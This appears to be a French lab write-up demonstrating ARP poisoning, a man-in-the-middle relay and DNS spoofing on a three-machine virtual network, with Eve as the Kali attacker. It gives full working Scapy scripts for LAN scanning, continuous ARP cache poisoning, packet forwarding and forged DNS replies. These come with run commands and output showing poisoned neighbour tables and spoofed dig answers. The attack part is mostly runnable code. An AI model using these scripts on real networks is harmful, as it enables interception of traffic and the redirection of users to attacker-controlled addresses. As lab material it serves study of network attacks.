# MITM et DNS Spoofing
Alice (routeur) : 
```bash=
[rocky@AliceRouteur ~]$ ip a
2: enp0s3
    link/ether 08:00:27:e1:4d:0a brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255
3: enp0s8:
    link/ether 08:00:27:59:b0:aa brd ff:ff:ff:ff:ff:ff
    inet 192.168.58.4/24 brd 192.168.58.255

```
Bob (victime) : 
```bash=
[rocky@Bob ~]$ ip a
2: enp0s8:
    link/ether 08:00:27:54:85:c6 brd ff:ff:ff:ff:ff:ff
    inet 192.168.58.5/24
    
[rocky@Bob ~]$ ip r s
default via 192.168.58.4 dev enp0s8

[rocky@Bob ~]$ ping 8.8.8.8 -c 1
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=34.7 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 34.655/34.655/34.655/0.000 ms
```
Eve (attaquant) : 
```bash=
┌──(kali㉿Eve)-[~]
└─$ ip a
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:bf:27:f4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.58.3/24
```
Activez l'IP forwarding (l'instruction dépend de l'os, ici l'exemple est effectué sur Kali) et lancez le programme en sudo depuis l'attaquant dans le dossier contenant ces [fichiers](./Program), puis suivez les instructions, de manière similaire à cet exemple : 
```bash=
┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo sysctl net.ipv4.ip_nonlocal_bind=1
net.ipv4.ip_nonlocal_bind = 1

┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python main.py
```
```bash=
Enter the network interface you wish to attack on : eth0
```
```bash=
Are those the IP adress and MAC adress of your computer on this LAN : 192.168.58.3/24 ; 08:00:27:bf:27:f4
yes
```
```bash=
Computers on lan :
1 - 192.168.58.1 ; 0a:00:27:00:00:02
2 - 192.168.58.2 ; 08:00:27:4b:e9:96
3 - 192.168.58.4 ; 08:00:27:59:b0:aa
4 - 192.168.58.5 ; 08:00:27:54:85:c6
Enter the number of the first machine you wish to attack : 3
Enter the number of the second machine you wish to attack : 4
```
```bash=
Man in the middle ongoing...
Enter 'stop' to interrupt the program : stop 
```
## 1. Scan réseau
```python=
# Fonction scannant toutes les machins d'une LAN
def scan(ip, iface): # ip : l'adresse ip de l'attaquant ; iface : le nom de l'interface réseau sur laquelle l'attaque est effectué

    clear() # vide le terminal
    print("Scanning, please wait 5 seconds...")
    # envoie une requête ARP a toutes les adresses IP du réseau
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface, timeout=5, verbose=False) 
    clear()
    return ans # renvoie les réponses
```

Résultat affiché par le programme : 
```bash=
Computers on lan :
1 - 192.168.58.1 ; 0a:00:27:00:00:02
2 - 192.168.58.2 ; 08:00:27:4b:e9:96
3 - 192.168.58.4 ; 08:00:27:59:b0:aa
4 - 192.168.58.5 ; 08:00:27:54:85:c6
Enter the number of the first machine you wish to attack : 
```
## 2. ARP Poisoning et MITM
### A. ARP Spoof
[arp_poisoning.py](./Program/Resources/arp_poisoning.py)
```python=
from scapy.all import *
import time

# Récupère les informations nécessaires au script contenu dans Resources/informations.txt
fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()
 # IP des victimes
ip_victime1 = contenu[0]
ip_victime2 = contenu[2]
# MAC de l'attaquant
mac = contenu[5]
# Interface réseau sur laquelle l'attaque est réalisée
iface = contenu[6]

# Envoie des fausses requêtes ARP aux deux victimes
while 1:
    send(ARP(pdst = ip_victime1, psrc = ip_victime2, hwsrc = mac), iface=iface, verbose=False)
    send(ARP(pdst = ip_victime2, psrc = ip_victime1, hwsrc = mac), iface=iface, verbose=False)
    time.sleep(1)
```
```bash=
[rocky@AliceRouteur ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.5 dev enp0s8 lladdr 08:00:27:54:85:c6 REACHABLE
```
```bash=
[rocky@Bob ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.4 dev enp0s8 lladdr 08:00:27:59:b0:aa STALE
```
```bash=
┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python Resources/arp_poisoning.py
```
```bash=
[rocky@AliceRouteur ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.5 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
```
```bash=
[rocky@Bob ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.4 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
```
[Trames ARP](./Trames/arp_poisoning.pcapng)
### B. MITM
[transfer_packets.py](./Program/Resources/transfer_packets.py)
```python=
from scapy.all import *

# Récupère les informations nécessaires au script contenu dans Resources/informations.txt
fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()

# Initialise les adresses IP et MAC des deux victimes
ip_victime1 = contenu[0]
mac_victime1 = contenu[1]
ip_victime2 = contenu[2]
mac_victime2 = contenu[3]
# adresse IP et  MAC de l'attaquant
ip = contenu[4]
mac = contenu[5]
# Interface réseau sur laquelle l'attaque est effectué
iface = contenu[6]

# voir la section DNS Spoofing ci-dessous pour plus de détails
fichier = open("Resources/dns_spoof.txt", "r")
dns_spoof = fichier.read().split("*")[1].split(";")
fichier.close()

for i in range(0,len(dns_spoof)):
    dns_spoof[i] = "".join(dns_spoof[i].split("\n")) + "."*(i%2 == 0)

# Modifie et renvoie les paquets interceptés
def change_dst(packet):
    try:
        # voir la section DNS Spoofing ci-dessous pour plus de détails
        if packet.haslayer(DNSQR) and packet[Ether].dst == mac:
            for i in range(0, len(dns_spoof)):
                if i%2 == 0:
                    if  packet[DNSQR].qname.decode("utf-8") == dns_spoof[i] :
                        print(dns_spoof[i+1])
                        dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata=dns_spoof[i+1]))
                        eth = Ether(src=mac, dst=packet[Ether].src)
                        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                        ip_couche = IP(src=packet[IP].dst, dst=packet[IP].src)
                        response_packet = eth / ip_couche / udp / dns
                        sendp(response_packet, iface=iface, verbose=False)
                        return
                    
        # Si l'attaquant est le destinataire du paquet mais pas l'expediteur 
        if packet[Ether].dst == mac and packet[IP].dst != ip:
            # Modifie l'adresse MAC de destinataire du paquet pour celle de la victime voulue
            packet[Ether].dst = mac_victime1*((packet[IP].dst == ip_victime1) or packet[IP].src == ip_victime2) + mac_victime2*((packet[IP].dst == ip_victime2) or packet.src == ip_victime2)
            # Remplace l'adresse MAC du destinataire pour celle de l'attaquant
            packet[Ether].src = mac
            # Envoie le paquet modifié
            sendp(packet, iface=iface, verbose=False)
    except IndexError:
        return

# Intercepte les paquets envoyés par les victimes
sniff(iface = iface, filter = "host "+ip_victime1+" or host "+ip_victime2, prn = change_dst)
```
```bash=
┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python Resources/arp_poisoning.py &

┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python Resources/transfer_packets.py 
```
```bash=
[rocky@Bob ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.4 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE

[rocky@Bob ~]$ ping 192.168.58.4 -c 1
PING 192.168.58.4 (192.168.58.4) 56(84) bytes of data.
64 bytes from 192.168.58.4: icmp_seq=1 ttl=64 time=56.8 ms

--- 192.168.58.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 56.830/56.830/56.830/0.000 ms
[rocky@Bob ~]$ ping 8.8.8.8 -c 1
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=76.7 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 76.670/76.670/76.670/0.000 ms
```
[Trames pings](./Trames/pings.pcapng)
## 3. DNS Spoofing
Fichier de configuration du DNS spoof : [dns_spoof.txt](./Program/Resources/dns_spoof.tx)
```bash=
Adresse_web;Adresse_IP;
*
google.com;1.2.3.4;
test.com;4.5.6.7;
test2.com;8.9.0.1;

```
[transfer_packets.py](./Program/Resources/transfer_packets.py)
```python=
from scapy.all import *

fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()

ip_victime1 = contenu[0]
mac_victime1 = contenu[1]
ip_victime2 = contenu[2]
mac_victime2 = contenu[3]
ip = contenu[4]
mac = contenu[5]
iface = contenu[6]

# Récupère les informations nécesaire au DNS spoofing
fichier = open("Resources/dns_spoof.txt", "r")
dns_spoof = fichier.read().split("*")[1].split(";")
fichier.close()

# Sépare tous les sites et adresses IP associées contenues dans le fichier dns_spoof.txt
for i in range(0,len(dns_spoof)):
    dns_spoof[i] = "".join(dns_spoof[i].split("\n")) + "."*(i%2 == 0)

def change_dst(packet):
    try:
        # Si le paquet contient une couche DNS et est à destination de l'attaquant
        if packet.haslayer(DNSQR) and packet[Ether].dst == mac:
            # Parcours les les sites DNS contenu dans dns_spoof.txt
            for i in range(0, len(dns_spoof)):
                if i%2 == 0:
                    # Si l'adresse web dans la requête DNS correspond à un site contenu dans dns_spoof.txt
                    if  packet[DNSQR].qname.decode("utf-8") == dns_spoof[i] :
                        print(dns_spoof[i+1])
                        # Génère une réponse DNS contenant la fausse adresse IP donné par dns_spoof.txt
                        dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata=dns_spoof[i+1]))
                        eth = Ether(src=mac, dst=packet[Ether].src)
                        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                        ip_couche = IP(src=packet[IP].dst, dst=packet[IP].src)
                        response_packet = eth / ip_couche / udp / dns
                        # Envoie la réponse DNS
                        sendp(response_packet, iface=iface, verbose=False)
                        return
        if packet[Ether].dst == mac and packet[IP].dst != ip:
           packet[Ether].dst = mac_victime1*((packet[IP].dst == ip_victime1) or packet[IP].src == ip_victime2) + mac_victime2*((packet[IP].dst == ip_victime2) or packet.src == ip_victime2)
            packet[Ether].src = mac
            sendp(packet, iface=iface, verbose=False)
    except IndexError:
        return

sniff(iface = iface, filter = "host "+ip_victime1+" or host "+ip_victime2, prn = change_dst)
```
```bash=
┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python Resources/arp_poisoning.py &

┌──(kali㉿Eve)-[~/Documents/Programs]
└─$ sudo python Resources/transfer_packets.py
```
```bash=
[rocky@Bob ~]$ ip n s
192.168.58.3 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
192.168.58.4 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE

[rocky@Bob ~]$ dig google.com

; <<>> DiG 9.16.23-RH <<>> google.com

;; ANSWER SECTION:
google.com.		600	IN	A	1.2.3.4

;; Query time: 22 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Nov 14 17:27:31 CET 2022
;; MSG SIZE  rcvd: 54

[rocky@Bob ~]$ dig test.com

; <<>> DiG 9.16.23-RH <<>> test.com

;; ANSWER SECTION:
test.com.		600	IN	A	4.5.6.7

;; Query time: 24 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Nov 14 17:27:37 CET 2022
;; MSG SIZE  rcvd: 50

[rocky@Bob ~]$ dig test2.com

; <<>> DiG 9.16.23-RH <<>> test2.com

;; ANSWER SECTION:
test2.com.		600	IN	A	8.9.0.1

;; Query time: 26 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Nov 14 17:27:43 CET 2022
;; MSG SIZE  rcvd: 52
```
[Trames DNS](./Trames/dns.pcapng)
